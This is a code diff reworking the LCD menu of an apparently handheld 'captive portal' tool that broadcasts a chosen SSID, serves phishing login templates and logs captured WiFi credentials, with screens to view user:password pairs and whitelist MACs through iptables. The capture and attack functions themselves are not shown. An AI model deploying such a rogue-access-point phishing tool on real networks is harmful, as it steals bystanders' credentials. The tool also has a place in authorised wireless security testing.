+    if not wl:
+        d.text((4, 40), "No whitelisted MACs", font=font, fill="#666")
+        d.text((4, 54), "OK adds last DHCP", font=font, fill="#666")
+        d.text((4, 66), "lease to whitelist", font=font, fill="#666")
+    else:
+        for i, mac in enumerate(wl[sc:sc + ROWS_VISIBLE]):
+            y = 16 + i * ROW_H
+            sel = (sc + i) == sc
+            d.text((2, y), f"{'>' if sel else ' '}{mac}", font=font,
+                   fill="#00CCFF" if sel else "#AAAAAA")
+    _draw_footer(d, f"{len(wl)} MACs OK:Add K3:Bk")
+    LCD.LCD_ShowImage(img, 0, 0)
+
+
+def draw_creds():
+    img, d = _new_frame()
+    _draw_header(d, "CAPTURED CREDS")
+    cred_lines = []
     try:
-        with open(path, "w") as fh:
-            json.dump(data, fh, indent=2)
-        with lock:
-            global status_msg
-            status_msg = f"Exported {len(data['credentials'])} creds"
+        with open(CREDS_LOG, "r") as f:
+            cred_lines = f.read().splitlines()
     except Exception:
         pass
-
-
-# ---------------------------------------------------------------------------
-# LCD rendering
-# ---------------------------------------------------------------------------
-
-def _draw_screen():
-    """Render state on LCD."""
-    img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
-    draw = ScaledDraw(img)
-
+    # Also show in-memory credentials not yet flushed
     with lock:
-        st = status_msg
-        vm = view_mode
-        sp = scroll_pos
-        si = selected_idx
-        tpls = list(templates)
-        creds = list(credentials)
-        cli = clients_connected
-        ssid_str = "".join(ssid)
-        sc = ssid_cursor
-        atk = attack_running
-        portal_up = _portal_running
-        tpl_name = active_template_name
+        mem_count = len(credentials)
+        sc = scroll_pos
+    if not cred_lines and mem_count == 0:
+        d.text((10, 50), "No creds yet", font=font, fill="#666")
+    else:
+        for i, line in enumerate(cred_lines[sc:sc + ROWS_VISIBLE]):
+            d.text((2, 16 + i * ROW_H), line[:22], font=font, fill="#FFAA00")
+    _draw_footer(d, f"{len(cred_lines)} lines  K3:Back")
+    LCD.LCD_ShowImage(img, 0, 0)
 
-    draw.text((2, 2), "Captive Portal", fill="CYAN", font=font)
-    portal_color = "GREEN" if portal_up else "RED"
-    portal_label = "RUN" if portal_up else "OFF"
-    draw.text((100, 2), portal_label, fill=portal_color, font=font)
 
-    draw.text((2, 14), st[:22], fill="WHITE", font=font)
-
-    if vm == "templates":
-        y = 28
-        for i, t in enumerate(tpls[sp:sp + ROWS_VISIBLE]):
-            real_i = sp + i
-            prefix = ">" if real_i == si else " "
-            color = "YELLOW" if real_i == si else "WHITE"
-            label = t["name"][:18]
-            if t["builtin"]:
-                label += " *"
-            draw.text((2, y), f"{prefix}{label}", fill=color, font=font)
-            y += 14
-        draw.text((2, 116), "OK=select UP/DN=scroll", fill="GRAY", font=font)
-
-    elif vm == "ssid_edit":
-        draw.text((2, 28), "Edit SSID:", fill="WHITE", font=font)
-        # Show SSID with cursor
-        ssid_display = ssid_str
-        draw.text((2, 44), ssid_display[:22], fill="GREEN", font=font)
-        # Cursor indicator
-        cursor_x = 2 + sc * 6  # approximate char width
-        draw.text((cursor_x, 56), "^", fill="RED", font=font)
-        draw.text((2, 72), "L/R=move UP/DN=char", fill="GRAY", font=font)
-        draw.text((2, 86), "OK=start portal", fill="GRAY", font=font)
-        draw.text((2, 116), "K3=back", fill="GRAY", font=font)
-
-    elif vm == "attack":
-        draw.text((2, 28), f"SSID: {ssid_str[:16]}", fill="GREEN", font=font)
-        draw.text((2, 42), f"Template: {tpl_name[:14]}", fill="WHITE", font=font)
-        draw.text((2, 56), f"Clients: {cli}", fill="YELLOW", font=font)
-        draw.text((2, 70), f"Creds: {len(creds)}", fill="RED" if creds else "GRAY", font=font)
-
-        # Show recent creds
-        y = 86
-        for c in creds[-2:]:
-            fields = c.get("fields", {})
-            user = fields.get("email", fields.get("username", fields.get("room", "?")))
-            draw.text((2, y), f"  {user[:20]}", fill="GREEN", font=font)
-            y += 10
-
-        draw.text((2, 116), "K1=creds K2=export", fill="GRAY", font=font)
-
-    elif vm == "creds":
-        y = 28
-        visible = creds[sp:sp + ROWS_VISIBLE]
-        for c in visible:
-            fields = c.get("fields", {})
-            user = fields.get("email", fields.get("username", "?"))
-            pw = fields.get("password", fields.get("lastname", "?"))
-            line = f"{user[:10]}:{pw[:10]}"
-            draw.text((2, y), line[:22], fill="GREEN", font=font)
-            y += 14
-        draw.text((2, 116), "OK=back UP/DN=scroll", fill="GRAY", font=font)
-
+def draw_ssid_editor():
+    img, d = _new_frame()
+    _draw_header(d, "EDIT SSID")
+    display = "".join(ssid_chars)
+    d.text((4, 20), display[:20], font=font, fill="#FFFFFF")
+    if len(display) > 20:
+        d.text((4, 32), display[20:], font=font, fill="#FFFFFF")
+    d.text((4, 50), f"Char: {SSID_CHARS[ssid_char_idx]}", font=font,
+           fill="#00CCFF")
+    d.text((4, 66), "U/D:char R:add L:del", font=font, fill="#666")
+    d.text((4, 78), "OK:confirm", font=font, fill="#666")
+    _draw_footer(d, f"Len: {len(ssid_chars)}/30  K3:Bk")
     LCD.LCD_ShowImage(img, 0, 0)
 
 
 # ---------------------------------------------------------------------------
-# Main loop
+# SSID editor init
+# ---------------------------------------------------------------------------
+
+def _init_ssid_editor():
+    global ssid_chars, ssid_char_idx
+    cfg = _load_config()
+    current = cfg.get("ssid", "FreeWiFi")
+    ssid_chars = list(current)
+    ssid_char_idx = 0
+
+
+# ---------------------------------------------------------------------------
+# Whitelist management
+# ---------------------------------------------------------------------------
+
+def _add_client_to_whitelist():
+    """Add the most recent DHCP lease MAC to the whitelist."""
+    try:
+        with open("/var/lib/misc/dnsmasq.leases", "r") as f:
+            lines = f.read().splitlines()
+    except Exception:
+        return "No leases found"
+    if not lines:
+        return "No leases"
+    parts = lines[-1].strip().split()
+    if len(parts) < 2:
+        return "Parse error"
+    mac = parts[1].upper()
+    wl = _load_whitelist()
+    if mac in wl:
+        return f"{mac} exists"
+    new_wl = list(wl) + [mac]
+    _save_whitelist(new_wl)
+    if portal_running and _iface:
+        _iptables_whitelist_add(_iface, mac)
+    return f"Added {mac}"
+
+
+def _remove_whitelist_entry(idx):
+    """Remove whitelist entry by index."""
+    wl = _load_whitelist()
+    if 0 <= idx < len(wl):
+        removed = wl[idx]
+        _save_whitelist(wl[:idx] + wl[idx + 1:])
+        return f"Removed {removed}"
+    return "Invalid index"
+
+
+# ---------------------------------------------------------------------------
+# Signal handling
+# ---------------------------------------------------------------------------
+
+def _signal_handler(_sig, _frame):
+    global running
+    running = False
+
+
+signal.signal(signal.SIGINT, _signal_handler)
+signal.signal(signal.SIGTERM, _signal_handler)
+
+
+# ---------------------------------------------------------------------------
+# Menu dispatch
+# ---------------------------------------------------------------------------
+
+def _handle_menu_select():
+    global view, scroll_pos
+    action = MENU_ITEMS[menu_idx]
+    if action == "Status":
+        with lock:
+            view = VIEW_STATUS
+            scroll_pos = 0
+    elif action in ("Start Portal", "Stop Portal", "Restart Portal"):
+        target = {
+            "Start Portal": _start_portal,
+            "Stop Portal": _stop_portal,
+            "Restart Portal": _restart_portal,
+        }[action]
+        threading.Thread(target=target, daemon=True).start()
+        with lock:
+            view = VIEW_STATUS
+    elif action == "Select Portal":
+        with lock:
+            view = VIEW_SELECT
+            scroll_pos = 0
+    elif action == "Set SSID":
+        _init_ssid_editor()
+        with lock:
+            view = VIEW_SSID
+    elif action == "Whitelist":
+        with lock:
+            view = VIEW_WHITELIST
+            scroll_pos = 0
+    elif action == "View Creds":
+        with lock:
+            view = VIEW_CREDS
+            scroll_pos = 0
+
+
+# ---------------------------------------------------------------------------
+# Main
 # ---------------------------------------------------------------------------
 
 def main():
-    global running, scroll_pos, selected_idx, view_mode, _iface
-    global ssid, ssid_cursor
+    global view, menu_idx, scroll_pos, status_msg, portal_running, running
+    global ssid_char_idx, ssid_chars, _iface
 
+    # Interface selection at startup
     _iface = select_interface(LCD, font, PINS, GPIO, iface_type="wifi")
+    if not _iface:
+        GPIO.cleanup()
+        return 1
+
+    # Splash screen
+    img, d = _new_frame()
+    d.text((6, 16), "CAPTIVE PORTAL", font=font, fill="#FF4444")
+    d.text((4, 36), "WiFi credential", font=font, fill="#888")
+    d.text((4, 48), "capture portal", font=font, fill="#888")
+    d.text((4, 68), f"Iface: {_iface}", font=font, fill="#00CCFF")
+    d.text((4, 80), "UP/DN:Nav  OK:Select", font=font, fill="#666")
+    d.text((4, 92), "K1:Toggle  K3:Exit", font=font, fill="#666")
+    LCD.LCD_ShowImage(img, 0, 0)
+    time.sleep(1.0)
 
     try:
-        if not _iface:
-            GPIO.cleanup()
-            return 1
-
-        # Discover templates
-        with lock:
-            global templates
-            templates = _discover_templates()
-            if not templates:
-                status_msg = "No templates found!"
-            else:
-                status_msg = f"{len(templates)} templates"
-
-        _draw_screen()
-
         while running:
             btn = get_button(PINS, GPIO)
 
             if btn == "KEY3":
-                if view_mode == "ssid_edit":
-                    with lock:
-                        view_mode = "templates"
-                else:
-                    running = False
+                if view == VIEW_MENU:
                     break
-
-            elif btn == "OK":
                 with lock:
-                    vm = view_mode
-                    si = selected_idx
-                    tpls = list(templates)
-                    atk = attack_running
+                    view = VIEW_MENU
+                    scroll_pos = 0
+                time.sleep(0.25)
+                continue
 
-                if vm == "templates" and 0 <= si < len(tpls):
+            if btn == "KEY1":
+                target = _stop_portal if portal_running else _start_portal
+                threading.Thread(target=target, daemon=True).start()
+                time.sleep(0.3)
+                continue
+
+            if view == VIEW_MENU:
+                if btn == "UP":
                     with lock:
-                        view_mode = "ssid_edit"
-
-                elif vm == "ssid_edit" and not atk:
-                    tpl = tpls[si] if 0 <= si < len(tpls) else None
-                    if tpl:
-                        threading.Thread(
-                            target=_start_attack, args=(tpl,), daemon=True,
-                        ).start()
-
-                elif vm == "creds":
+                        menu_idx = max(0, menu_idx - 1)
+                    time.sleep(0.15)
+                elif btn == "DOWN":
                     with lock:
-                        view_mode = "attack"
+                        menu_idx = min(len(MENU_ITEMS) - 1, menu_idx + 1)
+                    time.sleep(0.15)
+                elif btn == "OK":
+                    _handle_menu_select()
+                    time.sleep(0.25)
+                draw_menu()
+
+            elif view == VIEW_STATUS:
+                draw_status()
+
+            elif view == VIEW_SELECT:
+                portals = _discover_portals()
+                if btn == "UP":
+                    with lock:
+                        scroll_pos = max(0, scroll_pos - 1)
+                    time.sleep(0.15)
+                elif btn == "DOWN":
+                    with lock:
+                        scroll_pos = min(
+                            max(0, len(portals) - 1), scroll_pos + 1,
+                        )
+                    time.sleep(0.15)
+                elif btn == "OK" and portals:
+                    with lock:
+                        idx = scroll_pos
+                    if 0 <= idx < len(portals):
+                        cfg = dict(_load_config())
+                        cfg["selected_portal"] = portals[idx]
+                        _save_config(cfg)
+                        with lock:
+                            status_msg = f"Set: {portals[idx]}"
+                    time.sleep(0.25)
+                draw_select_portal()
+
+            elif view == VIEW_WHITELIST:
+                wl = _load_whitelist()
+                if btn == "UP":
+                    with lock:
+                        scroll_pos = max(0, scroll_pos - 1)
+                    time.sleep(0.15)
+                elif btn == "DOWN":
+                    with lock:
+                        scroll_pos = min(
+                            max(0, len(wl) - 1), scroll_pos + 1,
+                        )
+                    time.sleep(0.15)
+                elif btn == "OK":
+                    msg = _add_client_to_whitelist()
+                    with lock:
+                        status_msg = msg
+                    time.sleep(0.25)
+                elif btn == "KEY2":
+                    with lock:
+                        idx = scroll_pos
+                    msg = _remove_whitelist_entry(idx)
+                    with lock:
+                        status_msg = msg
                         scroll_pos = 0
+                    time.sleep(0.25)
+                draw_whitelist()
 
-            elif btn == "UP":
+            elif view == VIEW_SSID:
+                cfg = _load_config()
+                current_ssid = cfg.get("ssid", "FreeWiFi")
+                result = lcd_keyboard(LCD, font, PINS, GPIO, title="EDIT SSID", default=current_ssid)
+                if result is not None:
+                    new_ssid = result or "FreeWiFi"
+                    cfg = dict(_load_config())
+                    cfg["ssid"] = new_ssid
+                    _save_config(cfg)
+                    with lock:
+                        status_msg = f"SSID: {new_ssid[:16]}"
                 with lock:
-                    if view_mode == "templates":
-                        if selected_idx > 0:
-                            selected_idx -= 1
-                        if selected_idx < scroll_pos:
-                            scroll_pos = selected_idx
-                    elif view_mode == "ssid_edit":
-                        # Change character at cursor position
-                        if ssid_cursor < len(ssid):
-                            current_char = ssid[ssid_cursor]
-                            idx = SSID_CHARS.index(current_char) if current_char in SSID_CHARS else 0
-                            new_idx = (idx + 1) % len(SSID_CHARS)
-                            new_ssid = list(ssid)
-                            new_ssid[ssid_cursor] = SSID_CHARS[new_idx]
-                            ssid = new_ssid
-                    elif view_mode in ("creds", "attack"):
-                        if scroll_pos > 0:
-                            scroll_pos -= 1
+                    view = VIEW_MENU
+                time.sleep(0.25)
 
-            elif btn == "DOWN":
-                with lock:
-                    if view_mode == "templates":
-                        if selected_idx < len(templates) - 1:
-                            selected_idx += 1
-                        if selected_idx >= scroll_pos + ROWS_VISIBLE:
-                            scroll_pos = selected_idx - ROWS_VISIBLE + 1
-                    elif view_mode == "ssid_edit":
-                        if ssid_cursor < len(ssid):
-                            current_char = ssid[ssid_cursor]
-                            idx = SSID_CHARS.index(current_char) if current_char in SSID_CHARS else 0
-                            new_idx = (idx - 1) % len(SSID_CHARS)
-                            new_ssid = list(ssid)
-                            new_ssid[ssid_cursor] = SSID_CHARS[new_idx]
-                            ssid = new_ssid
-                    elif view_mode == "creds":
-                        max_s = max(0, len(credentials) - ROWS_VISIBLE)
-                        if scroll_pos < max_s:
-                            scroll_pos += 1
+            elif view == VIEW_CREDS:
+                try:
+                    with open(CREDS_LOG, "r") as f:
+                        total = len(f.read().splitlines())
+                except Exception:
+                    total = 0
+                if btn == "UP":
+                    with lock:
+                        scroll_pos = max(0, scroll_pos - 1)
+                    time.sleep(0.15)
+                elif btn == "DOWN":
+                    with lock:
+                        scroll_pos = min(
+                            max(0, total - 1), scroll_pos + 1,
+                        )
+                    time.sleep(0.15)
+                draw_creds()
 
-            elif btn == "LEFT":
-                with lock:
-                    if view_mode == "ssid_edit":
-                        if ssid_cursor > 0:
-                            ssid_cursor -= 1
-
-            elif btn == "RIGHT":
-                with lock:
-                    if view_mode == "ssid_edit":
-                        if ssid_cursor < len(ssid) - 1:
-                            ssid_cursor += 1
-                        elif ssid_cursor == len(ssid) - 1 and len(ssid) < 32:
-                            ssid = list(ssid) + ["A"]
-                            ssid_cursor += 1
-
-            elif btn == "KEY1":
-                with lock:
-                    if attack_running:
-                        view_mode = "creds"
-                        scroll_pos = 0
-
-            elif btn == "KEY2":
-                threading.Thread(target=_export_creds, daemon=True).start()
-
-            _draw_screen()
-            time.sleep(0.15)
+            time.sleep(0.05)
 
     finally:
-        running = False
-
-        if attack_running:
-            _stop_attack()
-
+        if portal_running:
+            _stop_portal()
         try:
-            img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
-            draw = ScaledDraw(img)
-            draw.text((10, 56), "Portal stopped", fill="RED", font=font)
-            LCD.LCD_ShowImage(img, 0, 0)
+            LCD.LCD_Clear()
         except Exception:
             pass
-
         GPIO.cleanup()
+
+    return 0
 
 
 if __name__ == "__main__":
-    main()
+    raise SystemExit(main())
